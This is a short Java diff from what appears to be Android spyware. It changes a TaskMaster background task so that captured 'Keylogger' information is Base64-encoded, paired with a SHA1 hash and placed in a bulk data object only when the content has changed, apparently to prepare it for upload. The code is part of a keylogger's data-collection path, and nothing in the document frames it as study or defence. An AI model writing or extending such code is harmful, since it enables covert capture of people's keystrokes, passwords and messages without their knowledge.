@@ -253,7 +253,10 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
             String information = info.toString();
             String SHA = SHA1Helper.SHA1(information);
             if (!SHA.equals(hash)) {
-                bulkData.put("Keylogger", Base64.encodeToString(information.getBytes(), Base64.URL_SAFE));
+                JSONObject object = new JSONObject();
+                object.put("Info", Base64.encodeToString(information.getBytes(), Base64.URL_SAFE));
+                object.put("Hash", Base64.encodeToString(SHA.getBytes(), Base64.URL_SAFE));
+                bulkData.put("Keylogger", object);
             }
 
         } catch (Exception ex) {
